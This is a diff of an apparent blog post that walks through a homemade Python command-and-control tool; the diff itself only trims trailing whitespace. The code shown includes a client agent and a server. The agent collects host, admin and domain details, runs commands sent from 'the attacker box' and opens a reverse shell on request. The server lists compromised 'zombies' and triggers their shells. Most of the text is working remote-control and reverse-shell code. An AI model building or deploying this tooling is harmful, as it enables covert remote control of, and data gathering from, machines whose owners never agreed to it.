@@ -43,7 +43,7 @@ exit_event = threading.Event()
 
 > reverse shell function
 
-**Use the code I posted here and save it as pyrevshell_client.py:** 
+**Use the code I posted here and save it as pyrevshell_client.py:**
 **Be sure to edit the ip and port info!!!**
 
 [https://g3tsyst3m.github.io/sockets/Create-your-own-Netcat-using-Python/](https://g3tsyst3m.github.io/sockets/Create-your-own-Netcat-using-Python/)
@@ -100,7 +100,7 @@ if "Administrators" in gathering.stdout:
     print("[+] members of local admins!")
     LocalAdmin="True"
 
-if OnADomain == "True":    
+if OnADomain == "True":
     info=os.environ["userdomain"] + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + LocalAdmin + "\n" + "Domain Joined: " + OnADomain + "\n" + "Domain Info: " + domaininfo.stdout + "\n" + "OS info: " + osinfo + "\n" + "IP address info: " + "\n" + ipaddrinfo
 else:
     info=os.environ.get('COMPUTERNAME') + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + LocalAdmin + "\n" + "Domain Joined: " + OnADomain + "\n" + "OS info: " + osinfo +"\n" + "IP address info: " + "\n" + ipaddrinfo
@@ -155,18 +155,18 @@ def receiver(client):
         except:
             print("server must have died...time to hop off")
             client.close()
-            os._exit(0) 
+            os._exit(0)
         data=data.decode('UTF-8') #get the commands we're sending from the attacker box
-        
+
         if ":msg:" in data:
             print(data)
         if ":whoami:" in data:
             whoami=os.getlogin()
             client.send(whoami.encode())
-       
+
         if ":shell:" in data: #start the reverse shell!
             exit_event.clear()
-            
+
             handler_thread2 = threading.Thread(target=startrevshellcli)
             handler_thread2.daemon = True
             handler_thread2.start()
@@ -183,10 +183,10 @@ def receiver(client):
             client.send(b"returned output: \n"+proc.stdout.read())
             proc.stdin.close()
             proc.terminate()
-            
+
         if "self-destruct" in data: #kill the agent!
             client.close()
-            os._exit(0) 
+            os._exit(0)
 ```
 
 Okay, so the `Client` was easy.  The `Server`, which is our main command and control center, is a bit more complex.  I'm running the server code on Linux btw.  Feel free to run it on Windows if you're so inclined.  it'll work but it's a bit buggy at the moment.  I've tried to include some checks to help make things cooperate nicely, where it's operating system agnostic. 😄
@@ -266,7 +266,7 @@ def init_main_sock():
         #print(clientinfo)
         clientlist.append([counter, conn, UserInfo])
         clientdata.append(clientinfo)
-        
+
         handler_thread = threading.Thread(target=probe)
         handler_thread.daemon = True
         handler_thread.start()
@@ -281,9 +281,9 @@ def init_main_sock():
 def server_selection():
     global clientlist
     commands="True"
-    
+
     while not "exit" in commands:
-        
+
         command=input(Fore.CYAN + "<< elev8 >> $ " + Fore.WHITE)
         if command=="":
             pass
@@ -324,7 +324,7 @@ def probe():
         global counter
         global clientlist
         global clientdata
-       
+
         ############################################################
         # are any not alive anymore?  do a keep-alive probe to see...
         ############################################################
@@ -355,11 +355,11 @@ def zombies():
     global clientlist
     global clientdata
     selection=""
-    
+
     if (len(clientlist)) <= 0:
         print(Fore.RED + "[!] no zombies yet..." + Fore.WHITE)
         return
-        
+
     print(Fore.GREEN + "Zombies: ", len(clientlist), Fore.WHITE)
 
     temp=0
@@ -372,8 +372,8 @@ def zombies():
     except:
         print(Fore.RED + "[!] enter client number..." + Fore.WHITE)
         time.sleep(2)
-        return 
-    
+        return
+
     while True:
         if os.name == 'nt':
             os.system("cls")
@@ -399,10 +399,10 @@ def zombies():
         print(Fore.WHITE)
         try:
             choice=input(Fore.YELLOW + "[Select a number]: $ " + Fore.WHITE)
-        except:    
+        except:
             print(Fore.RED + "[!] enter a number..." + Fore.WHITE)
             time.sleep(2)
-            return            
+            return
         if choice == "1":
             try:
                 clientlist[selection][1].send(b":msg:\nhey from the server!\n")
@@ -438,16 +438,16 @@ def zombies():
             #starttheshell(clientlist[selection][1])
             #subprocess.call(["python", "testsocketserver.py"])
             exit_event.clear()
-            
+
             handler_thread = threading.Thread(target=startrevshellsvr)
             handler_thread.daemon = True
             handler_thread.start()
-            
+
             print("[+] starting shell in 2 seconds!")
             time.sleep(2)
-            
+
             clientlist[selection][1].send(b":shell:\n")
-            
+
             #handler_thread2 = threading.Thread(target=startrevshellcli)
             #handler_thread2.daemon = True
             #handler_thread2.start()
